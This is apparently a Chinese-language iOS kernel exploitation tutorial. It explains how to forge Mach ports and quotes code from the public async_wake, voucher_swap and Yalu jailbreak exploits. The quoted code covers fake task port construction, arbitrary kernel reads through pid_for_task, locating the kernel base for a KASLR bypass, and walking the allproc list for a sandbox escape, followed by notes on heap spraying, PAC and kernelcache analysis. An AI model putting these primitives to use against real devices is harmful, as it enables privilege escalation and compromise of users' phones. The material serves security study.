第一个成员是ipc_object，可以在osfmk/ipc/ipc_object.h中找到其定义： 12345678910111213141516/* * The ipc_object is used to both tag and reference count these two data * structures, and (Noto Bene!) pointers to either of these or the * ipc_object at the head of these are freely cast back and forth; hence * the ipc_object MUST BE FIRST in the ipc_common_data. * * If the RPC implementation enabled user-mode code to use kernel-level * data structures (as ours used to), this peculiar structuring would * avoid having anything in user code depend on the kernel configuration * (with which lock size varies). */struct ipc_object { ipc_object_bits_t io_bits; ipc_object_refs_t io_references; lck_spin_t io_lock_data;}; ipc_object的第一个成员io_bits： 12345678910111213141516171819202122232425262728/* * IPC steals the high-order bits from the kotype to use * for its own purposes. This allows IPC to record facts * about ports that aren't otherwise obvious from the * existing port fields. In particular, IPC can optionally * mark a port for no more senders detection. Any change * to IO_BITS_PORT_INFO must be coordinated with bitfield * definitions in ipc_port.h. */#define IO_BITS_PORT_INFO 0x0000f000 /* stupid port tricks */#define IO_BITS_KOTYPE 0x00000fff /* used by the object */#define IO_BITS_OTYPE 0x7fff0000 /* determines a zone */#define IO_BITS_ACTIVE 0x80000000 /* is object alive? */#define io_active(io) (((io)-&gt;io_bits &amp; IO_BITS_ACTIVE) != 0)#define io_otype(io) (((io)-&gt;io_bits &amp; IO_BITS_OTYPE) &gt;&gt; 16)#define io_kotype(io) ((io)-&gt;io_bits &amp; IO_BITS_KOTYPE)#define io_makebits(active, otype, kotype) \\ (((active) ? IO_BITS_ACTIVE : 0) | ((otype) &lt;&lt; 16) | (kotype))/* * Object types: ports, port sets, kernel-loaded ports */#define IOT_PORT 0#define IOT_PORT_SET 1#define IOT_NUMBER 2 /* number of types used */ 需要设置IO_BITS_ACTIVE以确保该对象存活。IO_BITS_OTYPE指定对象类型。IO_BITS_KOTYPE指定端口类型，是一个任务端口或时钟端口等。创建伪造的端口时需要在io_bits中指定这些值。完整列表可以在BUILD/obj/EXPORT_HDRS/osfmk/kern/ipc_kobject.h中找到。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051092: #define IKOT_NONE 0093: #define IKOT_THREAD 1094: #define IKOT_TASK 2095: #define IKOT_HOST 3096: #define IKOT_HOST_PRIV 4097: #define IKOT_PROCESSOR 5098: #define IKOT_PSET 6099: #define IKOT_PSET_NAME 7100: #define IKOT_TIMER 8101: #define IKOT_PAGING_REQUEST 9102: #define IKOT_MIG 10103: #define IKOT_MEMORY_OBJECT 11104: #define IKOT_XMM_PAGER 12105: #define IKOT_XMM_KERNEL 13106: #define IKOT_XMM_REPLY 14107: #define IKOT_UND_REPLY 15108: #define IKOT_HOST_NOTIFY 16109: #define IKOT_HOST_SECURITY 17110: #define IKOT_LEDGER 18111: #define IKOT_MASTER_DEVICE 19112: #define IKOT_TASK_NAME 20113: #define IKOT_SUBSYSTEM 21114: #define IKOT_IO_DONE_QUEUE 22115: #define IKOT_SEMAPHORE 23116: #define IKOT_LOCK_SET 24117: #define IKOT_CLOCK 25118: #define IKOT_CLOCK_CTRL 26119: #define IKOT_IOKIT_IDENT 27120: #define IKOT_NAMED_ENTRY 28121: #define IKOT_IOKIT_CONNECT 29122: #define IKOT_IOKIT_OBJECT 30123: #define IKOT_UPL 31124: #define IKOT_MEM_OBJ_CONTROL 32125: #define IKOT_AU_SESSIONPORT 33126: #define IKOT_FILEPORT 34127: #define IKOT_LABELH 35128: #define IKOT_TASK_RESUME 36129: #define IKOT_VOUCHER 37130: #define IKOT_VOUCHER_ATTR_CONTROL 38131: #define IKOT_WORK_INTERVAL 39132: #define IKOT_UX_HANDLER 40133: 134: /*135: * Add new entries here and adjust IKOT_UNKNOWN.136: * Please keep ipc/ipc_object.c:ikot_print_array up to date.137: */138: #define IKOT_UNKNOWN 41 /* magic catchall */139: #define IKOT_MAX_TYPE (IKOT_UNKNOWN+1) /* # of IKOT_ types */140: 141: 142: #define is_ipc_kobject(ikot) ((ikot) != IKOT_NONE) 设置端口的io_bits示例代码如下所示： 123456#define IO_BITS_ACTIVE 0x80000000#define IKOT_TASK 2#define IKOT_CLOCK 25fakeport-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;secondfakeport-&gt;io_bits = IKOT_TASK|IO_BITS_ACTIVE; ipc_object的io_references也需要被设置为不为0的值确保该对象不释放。 回到端口结构体，另一个重要成员是struct ipc_space * receiver，它指向ipc_space结构体。任务的ipc_space结构体定义其IPC功能。每个IPC功能都由一个ipc_entry表示，并放在一个表中，ipc_space结构体中的is_table指向该表。is_table中的端口权限或功能为16位，其名称实际上是is_table的索引。重要的是注意在内核中，端口权限(mach_port_t)通过传递指向适当的端口数据结构体(ipc_port_t)的指针来表示。 1234567891011121314struct ipc_space { lck_spin_t is_lock_data; ipc_space_refs_t is_bits; /* holds refs, active, growing */ ipc_entry_num_t is_table_size; /* current size of table */ ipc_entry_num_t is_table_free; /* count of free elements */ ipc_entry_t is_table; /* an array of entries */ task_t is_task; /* associated task */ struct ipc_table_size *is_table_next; /* info for larger table */ ipc_entry_num_t is_low_mod; /* lowest modified entry during growth */ ipc_entry_num_t is_high_mod; /* highest modified entry during growth */ struct bool_gen bool_gen; /* state for boolean RNG */ unsigned int is_entropy[IS_ENTROPY_CNT]; /* pool of entropy taken from RNG */ int is_node_id; /* HOST_LOCAL_NODE, or remote node if proxy space */}; ipc_space是非常重要的结构体，因此，大多数EXP程序都会寻找内核ipc_space以便获得适当的(但仍为假的)内核任务端口。方法是将ipc_space_kernel复制到新的内存，并使假的端口的receiver指向该内存。 根据io_bits中设置的kobject类型，kobject指向不同的数据结构。因此如果伪造任务端口则需要将kobject指向struct task，如果是时钟，则指向struct clock。 async_wake EXP中相关的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647uint8_t* build_message_payload(uint64_t dangling_port_address, uint32_t message_body_size, uint32_t message_body_offset, uint64_t vm_map, uint64_t receiver, uint64_t** context_ptr) { uint8_t* body = malloc(message_body_size); memset(body, 0, message_body_size); uint32_t port_page_offset = dangling_port_address &amp; 0xfff; // structure required for the first fake port: uint8_t* fake_port = body + (port_page_offset - message_body_offset); *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK; *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver; *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = 0x123456789abcdef; *context_ptr = (uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)); // set the kobject pointer such that task-&gt;bsd_info reads from ip_context: int fake_task_offset = koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) - koffset(KSTRUCT_OFFSET_TASK_BSD_INFO); uint64_t fake_task_address = dangling_port_address + fake_task_offset; *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_address; // when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task // pointer up there it's actually all in the buffer so we can also set the reference count to leak it, let's double check that! if (fake_port + fake_task_offset &lt; body) { printf(&quot;the maths is wrong somewhere, fake task doesn't fit in message\\n&quot;); sleep(10); exit(EXIT_FAILURE); } uint8_t* fake_task = fake_port + fake_task_offset; // set the ref_count field of the fake task: *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references // make sure the task is active *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1; // set the vm_map of the fake task: *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map; // set the task lock type of the fake task's lock: *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22; return body;} 拓展知识：CanSecWest 2017 - Port(al) to the iOS Core pid_for_task()任意读取如前所述，pid_for_task()将给出相应任务的PID。假设p_pid的偏移量为0x10，并且假设要读取的地址为addr，则可以创建一个伪造端口，然后将其关联到假的任务，使得该任务中的bsd_info为addr-0x10。 下面是voucher_swap EXP中相关的代码： 1234567891011121314151617181920212223242526272829303132333435/* * stage1_read32 * * Description: * Read a 32-bit value from kernel memory using our fake port. * * This primitive requires that we know the address of the pipe buffer containing our port. */static uint32_tstage1_read32(uint64_t address) { // Do a read to make the pipe available for a write. read_pipe(); // Create our fake task. The task's proc's p_pid field overlaps with the address we want to // read. uint64_t fake_proc_address = address - OFFSET(proc, p_pid); uint64_t fake_task_address = pipe_buffer_address + fake_task_offset; uint8_t *fake_task = (uint8_t *) pipe_buffer + fake_task_offset; FIELD(fake_task, task, ref_count, uint64_t) = 2; FIELD(fake_task, task, bsd_info, uint64_t) = fake_proc_address; // Initialize the port as a fake task port pointing to our fake task. uint8_t *fake_port_data = (uint8_t *) pipe_buffer + fake_port_offset; FIELD(fake_port_data, ipc_port, ip_bits, uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK); FIELD(fake_port_data, ipc_port, ip_kobject, uint64_t) = fake_task_address; // Write our buffer to kernel memory. write_pipe(); // Now use pid_for_task() to read our value. int pid = -1; kern_return_t kr = pid_for_task(fake_port, &amp;pid); if (kr != KERN_SUCCESS) { ERROR(&quot;%s returned %d: %s&quot;, &quot;pid_for_task&quot;, kr, mach_error_string(kr)); ERROR(&quot;could not read kernel memory in stage %d using %s&quot;, 1, &quot;pid_for_task&quot;); fail(); } return (uint32_t) pid;} 调用两次就可以读取64bit： 12345678910111213141516/* * stage1_read64 * * Description: * Read a 64-bit value from kernel memory using our stage 1 read primitive. */static uint64_tstage1_read64(uint64_t address) { union { uint32_t value32[2]; uint64_t value64; } u; u.value32[0] = stage1_read32(address); u.value32[1] = stage1_read32(address + 4); return u.value64;} 注意偏移量会随着iOS版本以及设备的不同而变化。这些偏移量既可以通过查看内核源代码来找到，也可以通过查看kernelcache文件来找到。 此技术非常强大，可一次读取4个字节的内核内存。还可以用该函数找到内核偏移。需要做的仅仅是每次向后读取四个字节的内核内存，直到获得魔术值0xfeedfacf为止。该地址是内核基地址，减去用IDA或Hopper打开kernelcache时的起始地址就得到了偏移量。 下面是Yalu EXP中相关的代码： 12345678910111213141516171819202122 while (1) { int32_t leaked = 0; // The offset from the start of &quot;struct task&quot; to &quot;task-&gt;bsd_info&quot; seems to be fixed to 0x360, but this is prone to change anytime in the future as apple sees fit // It'd be nice to use a heuristic method like how K33n Team does it with the cpu_clock thing *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10; // This tries to read a value from &quot;task-&gt;bsd_info-&gt;p_pid&quot; which translates to &quot;faketask-&gt;bsd_info-&gt;p_pid = (leaked_ptr - 0x10)-&gt;p_pid = leaked_ptr&quot; pid_for_task(foundport, &amp;leaked); // Is it 0xfeedfacf? if (leaked == MH_MAGIC_64) { NSLog(@&quot;found kernel text at %llx&quot;, leaked_ptr); break; } // Retreat one page and search again leaked_ptr -= 0x4000; }// Found kernel base!uint64_t kernel_base = leaked_ptr;..........................................// Calculating KASLR slideextern uint64_t slide;slide = kernel_base - 0xFFFFFFF007004000; 获得了内核基地址就可以在内核内存中找到一些重要的结构体，例如extern struct proclist allproc;。可以在/bsd/sys/proc_internal.h中找到它。即使存在KASLR，它相对内核基地址的偏移总是固定的。正如我们从内核代码中看到的那样，该结构体包含进程的列表。也可以使用jtool2 –analyze命令找到符号地址，因为Apple错误地发布了含有符号的kernelcache。 1234567891011121314151617181920212223extern lck_grp_attr_t * proc_lck_grp_attr;extern lck_attr_t * proc_lck_attr;LIST_HEAD(proclist, proc);extern struct proclist allproc; /* List of all processes. */extern struct proclist zombproc; /* List of zombie processes. */extern struct proc *initproc;extern void procinit(void);extern void proc_lock(struct proc *);extern void proc_unlock(struct proc *);extern void proc_spinlock(struct proc *);extern void proc_spinunlock(struct proc *);extern void proc_list_lock(void);extern void proc_list_unlock(void);extern void proc_klist_lock(void);extern void proc_klist_unlock(void);extern void proc_fdlock(struct proc *);extern void proc_fdlock_spin(struct proc *);extern void proc_fdunlock(struct proc *);extern void proc_fdlock_assert(proc_t p, int assertflags);extern void proc_ucred_lock(struct proc *);extern void proc_ucred_unlock(struct proc *); 然后，可以再次使用pid_for_task()来遍历这些结构体，通过检查pid=getpid()找到当前proc结构体(这样我们以后可以更改当前proc的cred以逃逸沙盒)，并通过检查pid=0来找到内核proc结构体(这样我们就可以获得内核proc的cred，找到kernel task，ipc_space_kernel等)。 1234567891011121314151617181920212223242526272829303132333435// extern struct proclist allproc;// This global variable stores the start of the linked_list of all proc objectsuint64_t allproc = allproc_offset + kernel_base;uint64_t proc_ = allproc;uint64_t myproc = 0;uint64_t kernproc = 0;// Traverse the linked list until the end of the list. I guess the next pointer of the last element is set to 0while (proc_) { uint64_t proc = 0; // Getting the address of the next proc object in the linked list *(uint64_t*) (faketask + procoff) = proc_ - 0x10; pid_for_task(foundport, (int32_t*)&amp;proc); // Need to read 2 times cause &quot;pid_for_task&quot; can only read 4 bytes at a time *(uint64_t*) (faketask + procoff) = 4 + proc_ - 0x10; pid_for_task(foundport, (int32_t*)(((uint64_t)(&amp;proc)) + 4)); // Getting the PID of from proc-&gt;p_pid int pd = 0; *(uint64_t*) (faketask + procoff) = proc; pid_for_task(foundport, &amp;pd); // Checking if it equals my PID if (pd == getpid()) { // Address of my proc struct myproc = proc; } else if (pd == 0){ // Address of the kernel proc struct kernproc = proc; } proc_ = proc;} 堆分配基础在iOS中，堆内存分为多个zone。相同大小的分配使用相同的zone，除非某些对象具有自己的特殊zone(ports，vouchers等)。这些zone随着分配对象增多而增长，并且从zone map中获得新页。在macOS上，可以使用zprint命令看到分配的zone。许多堆分配技术在iOS中仍然相同。另一件事是要注意，iOS也具有zone垃圾回收。 如上所述，某些对象具有自己的特殊zone。zone是固定大小的数据块的集合，可以对其进行快速分配和释放。例如，在下图中，我们可以看到很多IPC对象，包括ports，vouchers等都有自己的zone。因此如果释放一个voucher那么将无法使用另一种对象占用释放的内存，除非触发zone垃圾回收并将包含该地址的页移动到其它位置，然后再分配另一种对象。 在最近的几个iOS版本中对堆采取了很多加固措施。 建议阅读这个Stefan Esser关于iOS内核堆的[PPT](https://gsec.hitb.org/materials/sg2016/D2 - Stefan Esser - iOS 10 Kernel Heap Revisited.pdf)，也可以阅读内核源代码，从osfmk/kern/zalloc.c开始，其中有一些堆分配的注释。 最近用于heap spray的常用技术之一是通过发送带有选项MACH_MSG_OOL_PORTS_DESCRIPTOR的Mach消息，以端口指针数组填充内存。这将调用ipc/ipc_kmsg.c中的ipc_kmsg_copyin_ool_ports_descriptor，它会调用kalloc(ports_length)将端口指针填充到堆中。 在voucher_swap EXP中可以看到这样做的好处：虽然分配端口会将它们放入ipc.port zone，但是如果是端口指针，就不是这样，因此可以使用端口指针占用释放的对象。用端口其实也可以，因为进行足够的喷射之后能够迫使内核进行垃圾回收并从zone map中分配新页，其中可能包括释放的对象。 123456789101112131415mach_msg_descriptor_t *ipc_kmsg_copyin_ool_ports_descriptor( mach_msg_ool_ports_descriptor_t *dsc, mach_msg_descriptor_t *user_dsc, int is_64bit, vm_map_t map,..................... dsc-&gt;address = NULL; /* for now */ data = kalloc(ports_length); if (data == NULL) { *mr = MACH_SEND_NO_BUFFER; return NULL; } 指针验证检查和CoreTrustARM 8.3指令集添加了一个称为PAC(Pointer Authentication Check，指针验证检查)的新功能，目的是检查指针的完整性。它将加密签名附加到指针值里未使用的位中，然后在使用指针之前验证这些签名。由于攻击者没有用于为这些指针创建签名的密钥，因此无法创建有效的指针。另一方面，CoreTrust是一个单独的内核扩展(com.apple.kext.CoreTrust)，它不允许自签名二进制文件(jtool2 -sign)在设备上运行。以前，Apple Mobile File Integrity Kext(AMFI.kext)与用户态amfid守护程序一起检查代码签名。可以通过将代码签名哈希注入AMFI trust cache，hook amfid异常端口并允许代码继续执行等多种方式来绕过。CoreTrust施加了一些其他检查，这些检查仅允许Apple签名的二进制文件在设备上运行。 KernelCacheKernelCache是一个包含核心内核及其内核拓展的Mach-O二进制文件，iOS10之前是加密的，现在可以通过IPSW文件解压得到，或者通过内核漏洞dump出来。 提取kext文件通过jtool2获取kext的地址信息，再在IDA中进行分析。或者也可以将kernelcache解码后，放在Ghidra中进行分析。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201$ ~/Downloads/jtool2/jtool2 -k kernelcache.release.n660xfffffff005c5c000:com.apple.kpi.mach0xfffffff005c5c080:com.apple.kpi.private0xfffffff005c5c100:com.apple.kpi.unsupported0xfffffff005c5c180:com.apple.kpi.iokit0xfffffff005c5c200:com.apple.kpi.libkern0xfffffff005c5c280:com.apple.kpi.bsd0xfffffff005c5c300:com.apple.iokit.IONetworkingFamily0xfffffff005c5de00:com.apple.iokit.IOTimeSyncFamily0xfffffff005c616c0:com.apple.driver.corecapture0xfffffff005c64bc0:com.apple.kec.corecrypto0xfffffff005c7cf00:com.apple.driver.IOImageLoader0xfffffff005c7f080:com.apple.driver.AppleBCMWLANFirmware.Hashstore0xfffffff005c8de00:com.apple.iokit.IOSlowAdaptiveClockingFamily0xfffffff005c8e380:com.apple.iokit.IOStorageFamily0xfffffff005c8f5c0:com.apple.iokit.IOReportFamily0xfffffff005c8fdc0:com.apple.driver.AppleARMPlatform0xfffffff005c99600:com.apple.driver.AppleSamsungSPI0xfffffff005c9a580:com.apple.kpi.dsep0xfffffff005c9a600:com.apple.kext.CoreTrust0xfffffff005c9b3c0:com.apple.driver.AppleMobileFileIntegrity0xfffffff005cc23c0:com.apple.iokit.IOHIDFamily0xfffffff005cc3f40:com.apple.driver.AppleEmbeddedLightSensor0xfffffff005cc7980:com.apple.driver.AppleS5L8920XPWM0xfffffff005cc7f00:com.apple.driver.AppleEmbeddedTempSensor0xfffffff005ccb7c0:com.apple.driver.usb.AppleUSBCommon0xfffffff005ccc200:com.apple.driver.AppleUSBHostMergeProperties0xfffffff005ccc7c0:com.apple.iokit.IOUSBDeviceFamily0xfffffff005cd0d40:com.apple.iokit.IOSerialFamily0xfffffff005cd1680:com.apple.iokit.IOSkywalkFamily0xfffffff005cd2f80:com.apple.driver.AppleOnboardSerial0xfffffff005cd4e40:com.apple.iokit.IOAccessoryManager0xfffffff005cda180:com.apple.driver.AppleARMPMU0xfffffff005cdcfc0:com.apple.driver.AppleSN2400Charger0xfffffff005cddf80:com.apple.iokit.IOSurface0xfffffff005ce3b00:com.apple.driver.IODARTFamily0xfffffff005ce5cc0:com.apple.driver.AppleM2ScalerCSCDriver0xfffffff005d14e80:com.apple.iokit.IOHDCPFamily0xfffffff005d1a100:com.apple.kec.Libm0xfffffff005d205c0:com.apple.iokit.IOAudio2Family0xfffffff005d20e40:com.apple.iokit.IOCECFamily0xfffffff005d217c0:com.apple.iokit.IOAVFamily0xfffffff005d38280:com.apple.AUC0xfffffff005d39900:com.apple.iokit.IOMobileGraphicsFamily0xfffffff005d400c0:com.apple.driver.AppleH8ADBE00xfffffff005d51dc0:com.apple.driver.AppleAVEH80xfffffff005dcf640:com.apple.driver.AppleFirmwareUpdateKext0xfffffff005dd2400:com.apple.driver.ApplePMGR0xfffffff005de4740:com.apple.driver.AppleS8000PMGR0xfffffff005de6380:com.apple.driver.AppleIPAppender0xfffffff005de6ec0:com.apple.driver.AppleMultitouchSPI0xfffffff005deb580:com.apple.iokit.IOPCIFamily0xfffffff005ded9c0:com.apple.driver.AppleEmbeddedPCIE0xfffffff005df3e80:com.apple.driver.AppleS800xPCIe0xfffffff005df6500:com.apple.driver.AppleS8000PCIe0xfffffff005df7280:com.apple.driver.AppleBiometricSensor0xfffffff005dfd8c0:com.apple.driver.ProvInfoIOKit0xfffffff005e01b40:com.apple.iokit.IOUSBHostFamily0xfffffff005e12800:com.apple.driver.usb.AppleUSBHostPacketFilter0xfffffff005e130c0:com.apple.driver.AppleS5L8960XDART0xfffffff005e14840:com.apple.driver.DiskImages0xfffffff005e15600:com.apple.driver.DiskImages.KernelBacked0xfffffff005e15dc0:com.apple.driver.DiskImages.RAMBackingStore0xfffffff005e16380:com.apple.driver.AppleJPEGDriver0xfffffff005e1bec0:com.apple.iokit.AppleARMIISAudio0xfffffff005e1ce40:com.apple.driver.AppleEmbeddedAudio0xfffffff005e239c0:com.apple.driver.AppleCSEmbeddedAudio0xfffffff005e24600:com.apple.iokit.IOMikeyBusFamily0xfffffff005e26780:com.apple.driver.AppleTriStar0xfffffff005e28d40:com.apple.driver.AppleEmbeddedMikeyBus0xfffffff005e2ae40:com.apple.driver.AppleMikeyBusAudio0xfffffff005e2e180:com.apple.driver.AppleHIDKeyboardEmbedded0xfffffff005e2e180:com.apple.driver.AppleS5L8940XI2C0xfffffff005e2ec80:com.apple.driver.AppleEmbeddedUSB0xfffffff005e30440:com.apple.iokit.IOCryptoAcceleratorFamily0xfffffff005e31300:com.apple.iokit.EncryptedBlockStorage0xfffffff005e31ac0:com.apple.driver.AppleEffaceableStorage0xfffffff005e33580:com.apple.driver.LightweightVolumeManager0xfffffff005e36040:com.apple.driver.usb.networking0xfffffff005e36680:com.apple.driver.usb.AppleUSBHostCompositeDevice0xfffffff005e37240:com.apple.driver.usb.cdc0xfffffff005e37900:com.apple.driver.usb.cdc.ncm0xfffffff005e38900:com.apple.driver.AppleUSBEthernetDevice0xfffffff005e39a80:com.apple.iokit.IO80211Family0xfffffff005e61ac0:com.apple.plugin.IOgPTPPlugin0xfffffff005e76f00:com.apple.driver.LSKDIOKit0xfffffff005e95200:com.apple.driver.FairPlayIOKit0xfffffff005eabe40:com.apple.driver.LSKDIOKitMSE0xfffffff005ec0cc0:com.apple.driver.AppleD55000xfffffff005eea380:com.apple.driver.IOSlaveProcessor0xfffffff005eea900:com.apple.driver.AppleA7IOP0xfffffff005eeed80:com.apple.driver.RTBuddy0xfffffff005efb840:com.apple.driver.AppleSMC0xfffffff005f01900:com.apple.driver.AppleSEPManager0xfffffff005f1aa80:com.apple.driver.AppleSSE0xfffffff005f1ba80:com.apple.driver.ASIOKit0xfffffff005f1d0c0:com.apple.driver.AppleS8000DWI0xfffffff005f1d880:com.apple.driver.AppleCS35L19Amp0xfffffff005f1e200:com.apple.driver.usb.IOUSBHostHIDDevice0xfffffff005f1fd80:com.apple.driver.AppleUSBDeviceAudioController0xfffffff005f20580:com.apple.driver.AppleUSBAudio0xfffffff005f22e40:com.apple.driver.DiskImages.UDIFDiskImage0xfffffff005f24080:com.apple.driver.AppleLMBacklight0xfffffff005f249c0:com.apple.iokit.IOUserEthernet0xfffffff005f25300:com.apple.iokit.IOSCSIArchitectureModelFamily0xfffffff005f26940:com.apple.iokit.IOSCSIBlockCommandsDevice0xfffffff005f27240:com.apple.iokit.IOUSBMassStorageDriver0xfffffff005f29bc0:com.apple.driver.AppleUSBCardReader0xfffffff005f2aec0:com.apple.driver.AppleS8000SOCTuner0xfffffff005f2bb00:com.apple.driver.AppleSynopsysMIPIDSI0xfffffff005f2f580:com.apple.nke.ppp0xfffffff005f31980:com.apple.nke.l2tp0xfffffff005f33880:com.apple.driver.AppleSynopsysOTGDevice0xfffffff005f36100:com.apple.driver.AppleSPU0xfffffff005f39780:com.apple.AGXFirmwareKextG5P0xfffffff005f57740:com.apple.driver.AppleS8000PMPFirmware0xfffffff005f58300:com.apple.driver.AppleTwisterErrorHandler0xfffffff005f59240:com.apple.driver.AppleS80000xfffffff005f5d840:com.apple.IOTextEncryptionFamily0xfffffff005f5e180:com.apple.driver.usb.AppleUSBHub0xfffffff005f63440:com.apple.driver.AppleH6CameraInterface0xfffffff005f6a380:com.apple.driver.AppleMobileApNonce0xfffffff005f6b280:com.apple.driver.AppleUSBMike0xfffffff005f6d100:com.apple.driver.AppleMultitouchSPIN660xfffffff005f6d100:com.apple.driver.AppleS8000CLPC0xfffffff005f72e40:com.apple.driver.AppleSEPKeyStore0xfffffff005f75240:com.apple.audio.IOBorealisOwl0xfffffff005f7f880:com.apple.driver.DiskImages.FileBackingStore0xfffffff005f7ffc0:com.apple.driver.ApplePMP0xfffffff005f82dc0:com.apple.iokit.IOStreamFamily0xfffffff005f83580:com.apple.driver.AppleS5L8960XNCO0xfffffff005f83b00:com.apple.driver.AppleChestnutDisplayPMU0xfffffff005f84340:com.apple.kec.pthread0xfffffff005f86640:com.apple.driver.AppleStockholmControl0xfffffff005f87040:com.apple.driver.AppleSamsungSerial0xfffffff005f87700:com.apple.driver.AppleBSDKextStarter0xfffffff005f87cc0:com.apple.driver.usb.cdc.ecm0xfffffff005f88440:com.apple.driver.AppleBasebandN710xfffffff005f8a200:com.apple.filesystems.apfs0xfffffff005fb0e80:com.apple.kext.AppleMatch0xfffffff005fb1200:com.apple.driver.AppleEffaceableBlockDevice0xfffffff005fb19c0:com.apple.driver.AppleS8000AES0xfffffff005fb3b00:com.apple.driver.AppleMesaSEPDriver0xfffffff005fba440:com.apple.driver.AppleBluetooth0xfffffff005fbabc0:com.apple.driver.usb.ethernet.asix0xfffffff005fbc200:com.apple.driver.AppleBasebandPCI0xfffffff005fc2a00:com.apple.driver.AppleSEPCredentialManager0xfffffff005fc7140:com.apple.driver.AppleS8003PCIe0xfffffff005fc7f00:com.apple.driver.AppleSamsungPKE0xfffffff005fc84c0:com.apple.driver.AppleInterruptController0xfffffff005fc9380:com.apple.driver.AppleC26Charger0xfffffff005fca7c0:com.apple.driver.AppleAuthCP0xfffffff005fcc440:com.apple.driver.AppleSPUSphere0xfffffff005fccb80:com.apple.driver.AppleS5L8960XGPIOIC0xfffffff005fcd9c0:com.apple.security.sandbox0xfffffff0060520c0:com.apple.driver.AppleHIDKeyboard0xfffffff006053200:com.apple.driver.AppleHDQGasGaugeControl0xfffffff006055e00:com.apple.driver.AppleTemperatureSensor0xfffffff006056b40:com.apple.driver.AppleAE2Audio0xfffffff006057e00:com.apple.driver.AppleNANDConfigAccess0xfffffff006058340:com.apple.iokit.IONVMeFamily0xfffffff006065000:com.apple.driver.AppleDialogPMU0xfffffff0060658c0:com.apple.driver.AppleD2255PMU0xfffffff006067540:com.apple.iokit.IOHIDEventDriver0xfffffff006067540:com.apple.driver.USBStorageDeviceSpecifics0xfffffff006067540:com.apple.driver.usb.AppleUSBEHCI0xfffffff006070cc0:com.apple.driver.AppleUSBHSIC0xfffffff006072d40:com.apple.driver.usb.AppleUSBOHCI0xfffffff006075b80:com.apple.driver.AppleEmbeddedUSBHost0xfffffff006076b00:com.apple.driver.usb.AppleUSBHostT70000xfffffff006078600:com.apple.driver.IOAudioCodecs0xfffffff00607b4c0:com.apple.driver.DiskImages.ReadWriteDiskImage0xfffffff00607ba00:com.apple.AppleFSCompression.AppleFSCompressionTypeZlib0xfffffff00607d180:com.apple.driver.AppleBluetoothDebugService0xfffffff00607d6c0:com.apple.driver.AppleBCMWLANCore0xfffffff0060b97c0:com.apple.driver.AppleBCMWLANBusInterfacePCIe0xfffffff0060c9180:com.apple.driver.AppleUSBDeviceNCM0xfffffff0060c9d80:com.apple.security.AppleImage40xfffffff0060cce80:com.apple.driver.AppleBSDKextStarterVPN0xfffffff0060cce80:com.apple.driver.AppleCS42L71Audio0xfffffff0060cfb00:com.apple.filesystems.hfs.kext0xfffffff0060e33c0:com.apple.driver.AppleS8000SmartIO0xfffffff0060ec940:com.apple.driver.AppleM68Buttons0xfffffff0060edec0:com.apple.driver.usb.IOUSBHostHIDDeviceSafeBoot0xfffffff0060edec0:com.apple.driver.AppleUSBDeviceMux0xfffffff0060ef740:com.apple.nke.pptp0xfffffff0060f0ac0:com.apple.driver.AppleBasebandPCIMAVControl0xfffffff0060f58c0:com.apple.driver.AppleS5L8960XWatchDogTimer0xfffffff0060f6440:com.apple.driver.AppleStorageDrivers0xfffffff0060f6440:com.apple.driver.ApplePinotLCD0xfffffff0060f6ac0:com.apple.iokit.IOAcceleratorFamily0xfffffff0060fc080:com.apple.iokit.usb.AppleUSBHostUserClient0xfffffff0060fc080:com.apple.driver.AppleUSBEthernetHost0xfffffff0060fd200:com.apple.driver.AppleIDAMInterface0xfffffff0060fdd80:com.apple.iokit.IOHIDEventDriverSafeBoot0xfffffff0060fdd80:com.apple.driver.AppleBasebandPCIMAVPDP0xfffffff0060fea00:com.apple.driver.AppleDiagnosticDataAccessReadOnly0xfffffff0060ff180:com.apple.iokit.IOAcceleratorFamily20xfffffff006108f40:com.apple.AGXG5P0xfffffff006119b40:com.apple.driver.AppleBiometricServices0xfffffff00611a7c0:com.apple.driver.AppleS5L8960XUSB 据说在越狱设备的/System/Library/Caches/com.apple.kernelcaches/目录下可以找到解压的kernelcache，但是我没找到。 Kernelcache符号，iOS12之后是不带kernelcache符号的，但是Apple误发了一个带有符号的beta版本，通过jtool2的analyze选项，可以分析kernelcache的符号并保存到文件中。 123456789101112131415161718192021$ ~/Downloads/jtool2/jtool2 --analyze kernelcache.release.iphone7Loaded 268/45/3/0 matchersAnalyzing kernelcache..This is a new-style A8 kernelcache (Darwin Kernel Version 18.2.0: Tue Oct 16 21:02:34 PDT 2018; root:xnu-4903.222.5~1/RELEASE_ARM64_T7000)-- Processing __TEXT_EXEC.__text..Disassembling 19389120 bytes from address 0xfffffff007680000 (offset 0x67c000):__ZN11OSMetaClassC2EPKcPKS_j is 0xfffffff007cb84bc (OSMetaClass)Analyzing 